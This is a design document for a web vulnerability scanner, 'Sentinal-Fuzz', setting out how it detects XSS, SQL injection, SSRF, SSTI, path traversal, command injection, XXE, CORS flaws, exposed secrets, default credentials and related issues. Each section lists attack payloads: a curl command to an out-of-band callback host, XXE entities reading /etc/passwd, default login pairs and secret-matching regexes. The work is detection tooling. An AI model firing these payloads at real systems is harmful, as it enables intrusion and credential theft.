# Sentinal-Fuzz — Vulnerability Coverage & Detection Strategy

> **Purpose**: This document defines the detection strategy for every vulnerability class that Sentinal-Fuzz will scan for. Each section is structured as a self-contained reference that the fuzzing engine and template system will implement against.

---

## Table of Contents

1. [Reflected XSS](#a-reflected-xss)
2. [Stored XSS](#b-stored-xss)
3. [DOM XSS](#c-dom-xss)
4. [SQL Injection — Error-Based](#d-sql-injection--error-based)
5. [SQL Injection — Time-Based Blind](#e-sql-injection--time-based-blind)
6. [SQL Injection — Boolean-Based Blind](#f-sql-injection--boolean-based-blind)
7. [SSRF](#g-ssrf-server-side-request-forgery)
8. [SSTI](#h-ssti-server-side-template-injection)
9. [Path Traversal / LFI](#i-path-traversal--lfi)
10. [Open Redirect](#j-open-redirect)
11. [Command Injection](#k-command-injection)
12. [XXE](#l-xxe-xml-external-entity)
13. [CORS Misconfiguration](#m-cors-misconfiguration)
14. [Sensitive Data Exposure](#n-sensitive-data-exposure)
15. [Security Headers Missing](#o-security-headers-missing)
16. [Default Credentials](#p-default-credentials-on-admin-panels)
17. [Exposed Admin Panels](#q-exposed-admin-panels)
18. [Directory Listing Enabled](#r-directory-listing-enabled)

---

## A. Reflected XSS

### What it is
An attacker-controlled payload is injected via a request parameter (query string, form field, header) and reflected back in the HTTP response without proper sanitization, allowing execution of arbitrary JavaScript in the victim's browser.

### How our scanner detects it — step by step
1. **Crawl & discover** all parameters (query strings, form inputs, URL fragments) on each page.
2. **Inject** a unique canary string (e.g., `sf7x2k<"'>`) into each parameter to test if the value is reflected and which context it lands in (HTML body, attribute, JS string, etc.).
3. **Analyze** the response to determine the reflection context:
   - Unquoted HTML body → inject tag-based payloads.
   - Inside an attribute → inject attribute-break payloads.
   - Inside a `<script>` block → inject JS-break payloads.
4. **Send** context-appropriate XSS payloads from the payload library.
5. **Check** if the payload appears **unencoded** in the response body.
6. **Verify** the `Content-Type` header is `text/html` (not `application/json`, `text/plain`, etc.).
7. **Check** for absence of effective CSP headers (`Content-Security-Policy` with `script-src` that blocks inline).
8. **Report** — flag as confirmed if unencoded payload found in HTML response without mitigating CSP.

### What the payload looks like
```
<script>alert('XSS')</script>
"><img src=x onerror=alert(1)>
'-alert(1)-'
<svg/onload=alert(1)>
javascript:alert(1)
```

### What the response signature looks like
- Response body contains the **exact injected payload** unencoded.
- `Content-Type` header includes `text/html`.
- HTTP status is `200`, `201`, or `3xx` (with reflection in redirect body).
- No effective `Content-Security-Policy` header blocking inline scripts.

### False positive risk: **Low**
- **Mitigation**: Verify the payload is truly unencoded (not HTML-entity-encoded). Check that `Content-Type` is `text/html`. Confirm CSP doesn't neutralize execution.

### Starter payloads
```
<script>alert('XSS')</script>
"><svg/onload=alert(1)>
'"><img src=x onerror=alert(1)>
<body onload=alert(1)>
javascript:alert(document.domain)
```

---

## B. Stored XSS

### What it is
An attacker submits a malicious script payload that the server persists (in a database, file, etc.) and later serves to other users without sanitization, causing JavaScript execution in their browsers.

### How our scanner detects it — step by step
1. **Identify** input points that persist data — forms with POST/PUT actions that create or update resources (comments, profiles, messages, etc.).
2. **Submit** a unique XSS payload through each writable input (e.g., `<script>alert('SFFUZZ-{{RANDOM_ID}}')</script>`).
3. **Crawl** pages linked from the submission point (the same page, listing pages, profile pages, feeds).
4. **Search** subsequent responses for the unique `SFFUZZ-{{RANDOM_ID}}` marker.
5. **If found unencoded** in an HTML response → flag as stored XSS.

### Limitations (important)
- **Cannot guarantee full coverage**: Stored XSS payloads may surface in admin panels, email notifications, PDF exports, or pages the crawler cannot reach.
- **Timing**: The payload may not appear until a background job processes it (e.g., moderation queue).
- **Authentication scope**: If the scanner is unauthenticated, it cannot submit to many writable endpoints.
- **Cleanup**: The scanner injects data into the target — this is intrusive and may not be acceptable for production environments.
- **Detection ceiling**: Without a browser rendering engine, we cannot confirm JavaScript execution; we can only confirm reflection.

### What the payload looks like
```
<script>alert('SFFUZZ-abc123')</script>
<img src=x onerror=alert('SFFUZZ-abc123')>
```

### What the response signature looks like
- A **subsequent page** (not the submission response) contains the injected marker unencoded.
- `Content-Type` is `text/html`.

### False positive risk: **Medium**
- **Mitigation**: Use a globally unique marker per scan. Only flag when the exact marker is found. Distinguish between reflection (immediate response) and storage (different request later).

### Starter payloads
```
<script>alert('SFFUZZ-{{ID}}')</script>
<img src=x onerror=alert('SFFUZZ-{{ID}}')>
<svg/onload=alert('SFFUZZ-{{ID}}')>
"><script>alert('SFFUZZ-{{ID}}')</script>
<body onload=alert('SFFUZZ-{{ID}}')>
```

---

## C. DOM XSS

### What it is
A client-side JavaScript vulnerability where user-controlled data flows from a DOM source (e.g., `location.hash`, `document.URL`) to a dangerous sink (e.g., `innerHTML`, `eval()`, `document.write()`) without sanitization, enabling script execution entirely in the browser.

### How our scanner detects it — step by step
1. **Static analysis** (heuristic, no browser needed):
   - Fetch the page's JavaScript files.
   - Parse for known **sources**: `location.hash`, `location.search`, `document.URL`, `document.referrer`, `window.name`, `postMessage` handlers.
   - Parse for known **sinks**: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `setInterval(string)`, `Function()`, `.href` assignment.
   - Flag when a source-to-sink data flow path is plausible.
2. **Dynamic analysis** (requires headless browser — future phase):
   - Load the page in a headless Chromium instance with Playwright/Puppeteer.
   - Inject taint-tracking markers into DOM sources (e.g., set `location.hash = '#<img src=x onerror=alert(1)>'`).
   - Monitor whether injected markers reach a sink and trigger DOM mutations or script execution.
3. **Report** — flag as potential DOM XSS with the identified source-sink pair.

### Limitations
- Static analysis produces **potential** findings only — many apparent source→sink flows are actually safe due to intermediate sanitization.
- Full confirmation requires a headless browser, adding significant scan time.
- Minified/obfuscated JS severely degrades static analysis accuracy.

### What the payload looks like
```
Payloads are injected into URL fragments and query parameters:
#<img src=x onerror=alert(1)>
?default=<script>alert(1)</script>
#'-alert(1)-'
```

### What the response signature looks like
- **Static**: Source keywords (`location.hash`, `document.URL`) and sink keywords (`innerHTML`, `eval`) found in JS source within the same function scope or call chain.
- **Dynamic**: The headless browser fires a script execution or DOM mutation from the injected marker.

### False positive risk: **High** (static analysis), **Low** (dynamic analysis)
- **Mitigation**: Rank static findings as "needs review." Use dynamic confirmation to promote to "confirmed."

### Starter payloads
```
#<img src=x onerror=alert(1)>
#"><svg/onload=alert(1)>
?q='-alert(1)-'
#javascript:alert(1)
?input=<script>alert(1)</script>
```

---

## D. SQL Injection — Error-Based

### What it is
An attacker injects malicious SQL syntax into a parameter, and the database engine returns a verbose error message in the HTTP response, confirming the injection point and often leaking schema information.

### How our scanner detects it — step by step
1. **Identify** all injectable parameters (query strings, POST body fields, cookies, headers like `X-Forwarded-For`).
2. **Inject** syntax-breaking payloads designed to trigger SQL parse errors (e.g., single quote `'`, double quote `"`, backslash `\`).
3. **Scan** the response body for **database error signatures** using regex patterns:
   - MySQL: `SQL syntax.*MySQL`, `Warning.*mysql_`, `MySqlException`
   - PostgreSQL: `PostgreSQL.*ERROR`, `pg_query()`, `unterminated quoted string`
   - MSSQL: `Microsoft.*ODBC.*SQL Server`, `Unclosed quotation mark`, `SqlException`
   - Oracle: `ORA-[0-9]{5}`, `oracle.*error`
   - SQLite: `SQLite3::`, `SQLITE_ERROR`, `unrecognized token`
   - Generic: `SQLSTATE[`, `syntax error at or near`
4. **Confirm** by sending a syntactically valid payload that should NOT trigger an error (e.g., `1 AND 1=1`) — if this response is clean but the error payload response contains DB errors, it's a confirmed SQLi.
5. **Report** with the matched error pattern and the triggering payload.

### What the payload looks like
```
'
"
\
1' OR '1'='1
1' AND '1'='2
') OR ('1'='1
```

### What the response signature looks like
- Response body matches one or more database error regex patterns.
- HTTP status is typically `500`, `200`, or `302` (many apps catch errors and still return `200`).
- Response length often differs significantly from a clean baseline request.

### False positive risk: **Low**
- **Mitigation**: Require at least one known DB error pattern match. Compare against baseline (clean parameter) response to rule out static error pages.

### Starter payloads
```
'
"
1' OR '1'='1
1 UNION SELECT NULL--
') OR ('1'='1--
```

---

## E. SQL Injection — Time-Based Blind

### What it is
An attacker injects a SQL command that causes the database to intentionally delay its response (e.g., `SLEEP(5)`); if the HTTP response time increases by the expected amount, SQL injection is confirmed — even though no error or data is visible in the response body.

### How our scanner detects it — step by step
1. **Establish baseline** response time by sending 3 normal requests and computing the average.
2. **Inject** time-delay payloads calibrated to add a noticeable delay (e.g., 5 seconds):
   - MySQL: `' OR SLEEP(5)--`
   - MSSQL: `'; WAITFOR DELAY '0:0:5'--`
   - PostgreSQL: `'; SELECT pg_sleep(5)--`
   - SQLite: `' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--` (CPU burn, no sleep function)
3. **Measure** actual response time.
4. **Compare** to baseline — if response time exceeds `baseline + delay_seconds - tolerance` (e.g., baseline is 200ms, delay is 5s, tolerance is 1s → flag if response ≥ 4200ms).
5. **Confirm** by sending the same payload with a **different** delay (e.g., 3 seconds) and verifying the response time scales proportionally.
6. **Report** with the delta in response time and the triggering payload.

### What the payload looks like
```
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
'; SELECT pg_sleep(5)--
1' AND (SELECT SLEEP(5))--
```

### What the response signature looks like
- Response body is **identical or very similar** to baseline (no visible difference).
- Response time is **≥ baseline + injected delay** (within tolerance).
- HTTP status is usually `200`.

### False positive risk: **Medium**
- **Mitigation**: Always confirm with two different delay values. Account for network jitter by using a generous tolerance. Retry on slow networks. Flag as "needs confirmation" if only one delay test succeeds.

### Starter payloads
```
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
'; SELECT pg_sleep(5)--
1' AND (SELECT SLEEP(5)) AND '1'='1
1; WAITFOR DELAY '0:0:5'--
```

---

## F. SQL Injection — Boolean-Based Blind

### What it is
An attacker injects SQL conditions that evaluate to true or false, and the application responds differently (different page content, status code, or response length) for each, allowing data extraction one bit at a time.

### How our scanner detects it — step by step
1. **Establish baseline** by sending the original parameter value and recording:
   - Response body length
   - Response body hash
   - HTTP status code
   - Key content markers (e.g., search result count)
2. **Inject TRUE condition**: `1' AND '1'='1` — expect the same response as baseline.
3. **Inject FALSE condition**: `1' AND '1'='2` — expect a **different** response from baseline.
4. **Compare** the three responses:
   - If `TRUE response ≈ baseline` AND `FALSE response ≠ baseline` → boolean-based blind SQLi confirmed.
5. **Differentiation metrics** — we compare:
   - Response body length (difference > 10% threshold)
   - HTTP status code difference
   - Presence/absence of specific content keywords
6. **Report** with the differential evidence.

### What the payload looks like
```
1' AND '1'='1    (TRUE — should return normal page)
1' AND '1'='2    (FALSE — should return different page)
1') AND ('1'='1  (TRUE with parenthesis context)
1') AND ('1'='2  (FALSE with parenthesis context)
```

### What the response signature looks like
- TRUE payload → response body matches baseline (same length, same status, same content).
- FALSE payload → response body **differs** from baseline (different length, missing content, different status).

### False positive risk: **Medium**
- **Mitigation**: Use multiple TRUE/FALSE pairs. Ensure the differential is consistent across retries. Rule out natural page variability (timestamps, CSRF tokens) by hashing only stable content regions.

### Starter payloads
```
1' AND '1'='1
1' AND '1'='2
1') AND ('1'='1
1') AND ('1'='2
1' AND 1=1--
```

---

## G. SSRF (Server-Side Request Forgery)

### What it is
An attacker tricks the server into making HTTP requests to unintended destinations — typically internal services, cloud metadata endpoints, or localhost — by supplying a crafted URL in a parameter the server fetches.

### How our scanner detects it — step by step
1. **Identify** URL-accepting parameters — any parameter whose value looks like a URL (contains `http://`, `https://`, or is named `url`, `uri`, `link`, `src`, `dest`, `redirect`, `callback`, `fetch`, `load`, etc.).
2. **Inject** SSRF payloads pointing to:
   - **Out-of-band callback** (primary strategy): A Sentinal-Fuzz listener or external callback service (e.g., Burp Collaborator-style). If the server hits the callback, SSRF is confirmed.
   - **Localhost probes**: `http://127.0.0.1`, `http://localhost`, `http://0.0.0.0`, `http://[::1]`.
   - **Cloud metadata**: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP).
   - **Internal ranges**: `http://10.0.0.1`, `http://192.168.1.1`, `http://172.16.0.1`.
3. **Check** the response for:
   - **OOB callback hit** (strongest signal).
   - **Internal service responses** in the body (HTML from internal apps, metadata API JSON).
   - **Error messages** revealing internal resolution (e.g., "Connection refused to 127.0.0.1:8080").
   - **Timing differences** (if server hangs trying to connect to filtered ports).
4. **Report** with the matched evidence.

### What the payload looks like
```
http://127.0.0.1:80
http://169.254.169.254/latest/meta-data/
http://[::1]
http://0x7f000001
http://localhost:22
```

### What the response signature looks like
- Response contains internal service content (e.g., AWS metadata JSON: `ami-id`, `instance-id`).
- Response contains error messages mentioning internal IPs or ports.
- OOB callback server receives a hit from the target's IP.
- Response time significantly longer when targeting filtered internal ports.

### False positive risk: **Low** (OOB-based), **Medium** (response-content-based)
- **Mitigation**: Prioritize OOB detection. For content-based, verify that internal content is not present in baseline responses. Check that the parameter is actually used in a server-side fetch (not just reflected).

### Starter payloads
```
http://127.0.0.1
http://169.254.169.254/latest/meta-data/
http://[::1]:80
http://0x7f000001
http://localhost:8080
```

---

## H. SSTI (Server-Side Template Injection)

### What it is
An attacker injects template syntax (e.g., `{{7*7}}`) into a user-controlled input that is processed by a server-side template engine (Jinja2, Twig, Freemarker, etc.), leading to arbitrary code execution on the server.

### How our scanner detects it — step by step
1. **Inject** arithmetic probe strings into every parameter:
   - `{{7*7}}` → expect `49` in response (Jinja2, Twig)
   - `${7*7}` → expect `49` (Freemarker, Velocity, Pebble, Spring EL)
   - `<%= 7*7 %>` → expect `49` (ERB, JSP)
   - `#{7*7}` → expect `49` (Pebble, Thymeleaf)
   - `{{7*'7'}}` → expect `7777777` in Jinja2 (string multiplication — distinguishes from Twig which returns `49`)
2. **Scan** the response body for the computed result (`49` or `7777777`).
3. **Fingerprint** the template engine:
   - If `{{7*'7'}}` returns `7777777` → Jinja2 (Python).
   - If `{{7*'7'}}` returns `49` → Twig (PHP).
   - If `${7*7}` returns `49` but `{{7*7}}` does not → Freemarker/Velocity/Pebble.
4. **Confirm** with a second, more complex expression:
   - Jinja2: `{{config.__class__.__init__.__globals__}}` — look for Python internals in response.
   - Twig: `{{_self.env.registerUndefinedFilterCallback("system")}}` — look for error or execution output.
5. **Report** with the identified template engine and proof-of-computation.

### What the payload looks like
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{{7*'7'}}
```

### What the response signature looks like
- Response body contains the **computed result** (`49`, `7777777`) rather than the raw template syntax.
- If the template syntax is reflected literally (e.g., `{{7*7}}` as-is), SSTI is NOT present.
- Error messages revealing template engine internals (e.g., Jinja2 `UndefinedError`, Freemarker `FreeMarkerException`).

### False positive risk: **Low**
- **Mitigation**: The number `49` can appear naturally in pages. Use compound probes — inject `{{7*191}}` (result: `1337`) or `{{123*456}}` (result: `56088`) which are unlikely to appear naturally. Verify that the injected expression is the only source of the computed value by checking baseline.

### Starter payloads
```
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
{{7*'7'}}
```

---

## I. Path Traversal / LFI

### What it is
An attacker manipulates a file path parameter to read arbitrary files from the server's filesystem by inserting directory traversal sequences (`../`) to escape the intended directory.

### How our scanner detects it — step by step
1. **Identify** file-referencing parameters — parameters named `file`, `path`, `page`, `template`, `include`, `doc`, `folder`, `dir`, or any parameter whose value ends in a file extension.
2. **Inject** traversal payloads targeting well-known files:
   - Linux: `../../../etc/passwd`, `....//....//etc/passwd`
   - Windows: `..\..\..\windows\win.ini`, `....\\....\\windows\\win.ini`
   - URL-encoded: `..%2F..%2F..%2Fetc%2Fpasswd`
   - Double-encoded: `..%252F..%252F..%252Fetc%252Fpasswd`
   - Null byte (legacy): `../../../etc/passwd%00.jpg`
3. **Check** the response body for **file content signatures**:
   - `root:x:0:0:` (Linux `/etc/passwd`)
   - `[fonts]` or `[extensions]` (Windows `win.ini`)
   - `[boot loader]` (Windows `boot.ini`)
4. **Confirm** by injecting a path to a file that definitely does NOT exist (e.g., `../../../etc/sf_nonexistent_8372`) and verifying the response differs from the successful read.
5. **Report** with the file content evidence and payload.

### What the payload looks like
```
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
../../../etc/passwd%00.jpg
```

### What the response signature looks like
- Response body contains `root:x:0:0:` (passwd file).
- Response body contains `[fonts]` or `[extensions]` (win.ini).
- HTTP status `200` with substantially more content than a normal error page.
- `Content-Type` may be `text/plain` or `application/octet-stream`.

### False positive risk: **Low**
- **Mitigation**: Match on specific file content patterns, not just response differences. Avoid flagging pages that naturally contain the word "root" or "fonts" by requiring the full signature pattern.

### Starter payloads
```
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
../../../etc/passwd%00.png
```

---

## J. Open Redirect

### What it is
An application accepts a user-controlled URL in a parameter and redirects the browser to it without validation, allowing an attacker to redirect victims to a malicious site (phishing, OAuth token theft).

### How our scanner detects it — step by step
1. **Identify** redirect parameters — parameters named `url`, `redirect`, `next`, `return`, `redir`, `returnTo`, `goto`, `target`, `dest`, `continue`, `callback`, etc.
2. **Inject** redirect payloads pointing to an external domain:
   - `https://evil.com`
   - `//evil.com` (protocol-relative)
   - `/\evil.com` (backslash trick)
   - `https://evil.com%00.trusted.com` (null byte)
   - `https://trusted.com@evil.com` (authority confusion)
3. **Send** the request and **do not follow redirects** (set `allow_redirects=False`).
4. **Check** the response:
   - HTTP status is `301`, `302`, `303`, `307`, or `308`.
   - `Location` header points to the injected external domain.
5. **Also check** for meta-refresh and JavaScript redirects in the body:
   - `<meta http-equiv="refresh" content="0;url=https://evil.com">`
   - `window.location = "https://evil.com"`
6. **Report** with the `Location` header value and payload.

### What the payload looks like
```
https://evil.com
//evil.com
/\evil.com
https://evil.com%00.trusted.com
https://trusted.com@evil.com
```

### What the response signature looks like
- HTTP status `3xx` with `Location` header containing the attacker-controlled domain.
- Or response body contains `meta http-equiv="refresh"` or `window.location` pointing to attacker domain.

### False positive risk: **Low**
- **Mitigation**: Only flag if the `Location` header or JS redirect targets the **exact attacker domain** we injected (not a partial match). Exclude internal redirects.

### Starter payloads
```
https://evil.com
//evil.com
/\evil.com
https://evil.com%00.trusted.com
https://trusted.com@evil.com
```

---

## K. Command Injection

### What it is
An attacker injects OS commands into a parameter that the server passes to a system shell (e.g., `exec()`, `system()`, `os.popen()`), allowing arbitrary command execution on the host.

### How our scanner detects it — step by step
1. **Identify** parameters likely passed to system commands — parameters named `cmd`, `exec`, `command`, `ping`, `ip`, `host`, `filename`, or parameters whose values look like filenames or hostnames.
2. **Inject** command injection payloads using shell metacharacters:
   - Semicolon: `; id`
   - Pipe: `| id`
   - Backticks: `` `id` ``
   - `$()`: `$(id)`
   - `&&`: `&& id`
   - Newline: `%0aid`
3. **Check** the response for command output signatures:
   - `uid=` followed by a number (output of `id` on Linux).
   - Known system file content.
4. **Time-based confirmation** (blind command injection):
   - Inject `; sleep 5` or `| sleep 5` and check if response time increases by ~5 seconds.
   - Inject `& ping -c 5 127.0.0.1 &` and check for ~5 second delay.
5. **OOB confirmation**:
   - Inject `; curl http://callback.sentinalfuzz.local/{{ID}}` and check for callback hit.
6. **Report** with matched output or timing evidence.

### What the payload looks like
```
; id
| id
`id`
$(id)
&& id
```

### What the response signature looks like
- Response body contains `uid=0(root)` or `uid=\d+\(\w+\)` pattern.
- Response time increases by the injected delay duration.
- OOB callback server receives a hit.

### False positive risk: **Low**
- **Mitigation**: The `uid=` pattern is highly specific. For time-based, apply the same double-delay confirmation as time-based SQLi. Avoid flagging pages that contain the word "uid" in a non-command-output context.

### Starter payloads
```
; id
| id
$(id)
`id`
&& id
```

---

## L. XXE (XML External Entity)

### What it is
An application parses user-supplied XML input with external entity processing enabled, allowing an attacker to read local files, perform SSRF, or cause denial of service via entity expansion.

### How our scanner detects it — step by step
1. **Identify** XML-accepting endpoints — requests with `Content-Type: application/xml`, `text/xml`, or `application/soap+xml`. Also check multipart file uploads accepting XML or SVG files.
2. **Inject** an XML payload defining an external entity that reads a well-known file:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <foo>&xxe;</foo>
   ```
3. **Send** the crafted XML in the request body.
4. **Check** the response for:
   - File content signatures (e.g., `root:x:0:0:` from `/etc/passwd`).
   - Error messages leaking file paths or DTD processing errors.
5. **Blind XXE** — if no file content appears in the response:
   - Use OOB exfiltration: define an entity that fetches from our callback server.
   - `<!ENTITY xxe SYSTEM "http://callback.sentinalfuzz.local/xxe-confirm">`
   - Check callback server for hits.
6. **Report** with entity content or OOB confirmation.

### What the payload looks like
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### What the response signature looks like
- Response body contains file content (`root:x:0:0:`).
- Response body contains XML parser error messages (`SAXParseException`, `lxml.etree`, `XMLSyntaxError`).
- OOB callback receives a request from the target server.

### False positive risk: **Low**
- **Mitigation**: The `/etc/passwd` content pattern is highly distinctive. For OOB, verify the callback source IP matches the target.

### Starter payloads
```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://callback/xxe">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
```

---

## M. CORS Misconfiguration

### What it is
The server sets overly permissive Cross-Origin Resource Sharing (CORS) headers, allowing malicious websites to read sensitive responses from authenticated APIs — effectively bypassing the Same-Origin Policy.

### How our scanner detects it — step by step
1. **Send** a request with an `Origin` header set to an attacker-controlled domain:
   - `Origin: https://evil.com`
2. **Check** the response headers:
   - `Access-Control-Allow-Origin: https://evil.com` (reflects the attacker origin — **vulnerable**).
   - `Access-Control-Allow-Origin: *` (wildcard — risky, but less exploitable if `Access-Control-Allow-Credentials` is not `true`).
   - `Access-Control-Allow-Credentials: true` combined with reflected origin → **critical**.
3. **Additional probes**:
   - `Origin: null` → check if `Access-Control-Allow-Origin: null` is returned (vulnerable — `null` origin is achievable via sandboxed iframes).
   - `Origin: https://trusted.com.evil.com` → check if subdomain matching is broken (prefix/suffix matching bugs).
4. **Report** with the misconfiguration type and exploitability assessment.

### What the payload looks like
```
Origin: https://evil.com
Origin: null
Origin: https://trusted.com.evil.com
Origin: https://eviltrusted.com
```

### What the response signature looks like
- `Access-Control-Allow-Origin` header reflects the attacker's `Origin` value.
- `Access-Control-Allow-Credentials: true` is present alongside a reflected origin.
- `Access-Control-Allow-Origin: *` (wildcard).

### False positive risk: **Low**
- **Mitigation**: Only flag as critical when `Allow-Credentials: true` is combined with origin reflection. Wildcard without credentials is a lower severity finding.

### Starter payloads
```
Origin: https://evil.com
Origin: null
Origin: https://trusted.com.evil.com
```

---

## N. Sensitive Data Exposure

### What it is
The application inadvertently exposes sensitive information — API keys, database credentials, stack traces, internal IPs, debug data — in HTTP responses, giving attackers reconnaissance data or direct access to backend systems.

### How our scanner detects it — step by step
1. **Crawl** all discovered pages and API endpoints.
2. **Scan** every response body with regex patterns for:
   - **API keys**: AWS keys (`AKIA[0-9A-Z]{16}`), Google API keys (`AIza[0-9A-Za-z\-_]{35}`), GitHub tokens (`ghp_[0-9A-Za-z]{36}`), Stripe keys (`sk_live_[0-9a-zA-Z]{24,}`), generic patterns (`api[_-]?key\s*[:=]\s*['"][0-9a-zA-Z]+['"]`).
   - **Stack traces**: Java (`at com.`, `java.lang.`, `Exception in thread`), Python (`Traceback (most recent call last)`, `File "`, `line \d+`), PHP (`Fatal error:`, `Stack trace:`), .NET (`System.`, `StackTrace`, `at line`).
   - **Internal IPs**: `10\.\d+\.\d+\.\d+`, `192\.168\.\d+\.\d+`, `172\.(1[6-9]|2\d|3[01])\.\d+\.\d+`.
   - **Database connection strings**: `jdbc:`, `mongodb://`, `mysql://`, `postgresql://`, `Server=.*Database=`.
   - **Email addresses**: Regex for internal email domains.
   - **Private keys**: `-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----`.
   - **Password/secret in source**: `password\s*[:=]\s*['"][^'"]+['"]`, `secret\s*[:=]`.
3. **Exclude** known safe patterns (minified JS variable names that happen to match, documentation examples).
4. **Report** each finding with the matched pattern, line snippet, and severity.

### What the response signature looks like
- Response body matches one or more sensitive data regex patterns.
- The match is in an actual response (not a documentation page or known safe context).

### False positive risk: **Medium–High**
- **Mitigation**: Use tight regex patterns. Exclude common false positive sources (JavaScript source maps, documentation pages). Provide context (surrounding 50 chars) so the human reviewer can quickly assess.

### Starter payloads
N/A — this is a passive detection technique. No payloads are injected; the scanner analyses response content from normal crawling.

### Detection patterns
```
AKIA[0-9A-Z]{16}
AIza[0-9A-Za-z\-_]{35}
ghp_[0-9A-Za-z]{36}
sk_live_[0-9a-zA-Z]{24,}
-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----
Traceback \(most recent call last\)
Fatal error:.*on line
```

---

## O. Security Headers Missing

### What it is
The server fails to include HTTP security headers that instruct browsers to enable built-in protections (XSS filters, framing prevention, HTTPS enforcement, content type sniffing prevention), leaving users vulnerable to various client-side attacks.

### How our scanner detects it — step by step
1. **Send** a standard GET request to the target URL.
2. **Check** for the presence and correctness of each security header:

| Header | Expected Value | Risk if Missing |
|--------|---------------|-----------------|
| `Content-Security-Policy` | Any valid policy | XSS, injection |
| `Strict-Transport-Security` | `max-age=` ≥ 31536000, include `includeSubDomains` | Downgrade attacks |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Clickjacking |
| `X-Content-Type-Options` | `nosniff` | MIME-sniffing attacks |
| `X-XSS-Protection` | `1; mode=block` (legacy) | Reflected XSS (older browsers) |
| `Referrer-Policy` | `strict-origin-when-cross-origin` or stricter | Information leakage |
| `Permissions-Policy` | Any valid policy | Feature abuse |
| `Cache-Control` | `no-store` for sensitive pages | Sensitive data caching |

3. **Parse** existing header values for weakness:
   - CSP with `unsafe-inline` or `unsafe-eval` → weak CSP, still flag.
   - HSTS with `max-age` < 31536000 → insufficient.
4. **Report** each missing or weak header as a separate low/medium severity finding.

### What the response signature looks like
- Header is absent from the response.
- Header is present but has a weak value.

### False positive risk: **Low**
- **Mitigation**: These are objective checks — a header is either present with a valid value or it isn't. The only subjective part is CSP quality assessment.

### Starter payloads
N/A — passive check, no payloads injected.

---

## P. Default Credentials on Admin Panels

### What it is
An admin panel or management interface is accessible and still uses factory-default username/password combinations, allowing trivial unauthorized access.

### How our scanner detects it — step by step
1. **Identify** admin panel login forms by:
   - Crawling known admin paths (see section Q).
   - Looking for login forms (`<form>` with password field) on discovered admin pages.
2. **Extract** form structure — identify username field, password field, submit button, and form action URL.
3. **Attempt** login with a curated list of default credential pairs:
   - `admin:admin`, `admin:password`, `admin:123456`, `admin:admin123`
   - `root:root`, `root:toor`, `root:password`
   - `administrator:administrator`
   - `test:test`, `user:user`
   - Product-specific: `tomcat:tomcat`, `manager:manager`, `admin:changeme`
4. **Analyze** the response to determine if login succeeded:
   - Redirect to a dashboard/admin page (not back to login).
   - Session cookie set (new `Set-Cookie` with session-like name).
   - Response body contains admin-specific content ("Dashboard", "Welcome admin", "Logout").
   - Response body does NOT contain login error messages ("Invalid", "incorrect", "failed").
5. **Report** with the working credential pair and the admin URL.

### What the response signature looks like
- Post-login response redirects to an admin dashboard (HTTP `302` to `/admin/dashboard` or similar).
- `Set-Cookie` header contains a session token.
- Response body contains admin content and lacks error messages.

### False positive risk: **Low**
- **Mitigation**: Verify that the post-login content is genuinely different from the login page. Check for the absence of error messages AND presence of admin content.

### Starter payloads
```
admin:admin
admin:password
admin:123456
root:root
administrator:administrator
```

---

## Q. Exposed Admin Panels

### What it is
Administrative interfaces (login pages, management consoles) are publicly accessible on the internet without IP restrictions, VPN requirements, or other access controls, giving attackers a target for brute-force attacks and exploitation.

### How our scanner detects it — step by step
1. **Probe** common admin panel URLs against the target:
   ```
   /admin
   /admin/login
   /administrator
   /wp-admin
   /wp-login.php
   /phpmyadmin
   /cpanel
   /webmail
   /manager/html (Tomcat)
   /jenkins
   /grafana
   /kibana
   /solr
   /actuator
   /swagger-ui.html
   /api-docs
   /console (H2, Rails)
   /_debug
   ```
2. **Send** GET requests to each path.
3. **Analyze** responses:
   - HTTP status `200` or `401` (auth required but panel exists) or `403` (forbidden but panel exists).
   - Response body contains login form, admin branding, or known admin panel signatures.
   - `Server` or `X-Powered-By` headers reveal the technology.
4. **Classify** severity:
   - `200` with login form → Medium (exposed, attackable).
   - `200` without login (direct access) → Critical.
   - `401`/`403` → Low/Info (exists but access-controlled).
5. **Report** with URL, status code, and identified panel type.

### What the response signature looks like
- HTTP status `200`, `401`, or `403` on a known admin path.
- Response body contains: "Login", "Sign in", "Administration", "Dashboard", "phpMyAdmin", "wp-login", "Jenkins", etc.
- Response headers reveal admin technology (`X-Jenkins`, `X-Powered-By: Express` on `/admin`).

### False positive risk: **Low**
- **Mitigation**: Only flag paths that return meaningful responses (not generic 404 pages). Compare admin path response with a known-invalid path response to detect custom 404 pages.

### Starter payloads (paths)
```
/admin
/wp-admin
/phpmyadmin
/manager/html
/jenkins
```

---

## R. Directory Listing Enabled

### What it is
The web server is configured to display directory contents (file listings) when no index file exists in a directory, potentially exposing sensitive files, backup archives, source code, or configuration files to attackers.

### How our scanner detects it — step by step
1. **Probe** common directories and subdirectories found during crawling:
   ```
   /
   /images/
   /uploads/
   /assets/
   /backup/
   /temp/
   /logs/
   /data/
   /includes/
   /config/
   ```
2. **Send** GET requests to each directory path (with trailing slash).
3. **Check** the response body for directory listing signatures:
   - Apache: `<title>Index of /`, `<h1>Index of /`
   - Nginx: `<title>Index of /`, autoindex format
